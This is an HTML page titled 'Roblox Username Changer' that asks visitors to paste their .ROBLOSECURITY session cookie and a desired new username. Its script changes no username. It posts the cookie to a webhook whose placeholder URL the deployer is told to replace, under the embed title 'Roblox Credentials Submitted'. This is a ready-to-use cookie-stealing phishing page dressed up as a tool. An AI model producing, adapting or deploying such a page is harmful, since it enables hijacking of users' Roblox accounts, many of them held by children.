<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Username Changer</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
        textarea { width: 100%; height: 100px; margin-bottom: 10px; }
        button { padding: 10px 15px; background: #4CAF50; color: white; border: none; cursor: pointer; }
        #status { margin-top: 10px; padding: 10px; display: none; }
        .success { background: #dff0d8; color: #3c763d; }
        .error { background: #f2dede; color: #a94442; }
    </style>
</head>
<body>
    <h1>Roblox Username Changer</h1>
    <p><strong>Warning:</strong> This will use your Roblox cookie to change your username.</p>
    
    <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
    <input type="text" id="newUsername" placeholder="New username">
    <button onclick="sendToWebhook()">Submit to Webhook</button>
    
    <div id="status"></div>

    <script>
        async function sendToWebhook() {
            const cookie = document.getElementById("cookieInput").value.trim();
            const newUsername = document.getElementById("newUsername").value.trim();
            const statusEl = document.getElementById("status");

            if (!cookie || !newUsername) {
                statusEl.textContent = "Please fill all fields!";
                statusEl.className = "error";
                statusEl.style.display = "block";
                return;
            }

            // Replace this with your actual webhook URL
            const webhookUrl = "https://your-webhook-url-here.com";
            
            const data = {
                content: "New submission received!",
                embeds: [{
                    title: "Roblox Credentials Submitted",
                    fields: [
                        { name: "ROBLOSECURITY Cookie", value: "||" + cookie + "||" }, // Using spoiler tags
                        { name: "Requested Username", value: newUsername }
                    ],
                    color: 0xff0000
                }]
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data),
                });

                if (response.ok) {
                    statusEl.textContent = "Data sent to webhook successfully!";
                    statusEl.className = "success";
                } else {
                    statusEl.textContent = "Error sending to webhook. Status: " + response.status;
                    statusEl.className = "error";
                }
            } catch (err) {
                statusEl.textContent = "Network error: " + err.message;
                statusEl.className = "error";
            }
            
            statusEl.style.display = "block";
        }
    </script>
</body>
</html>
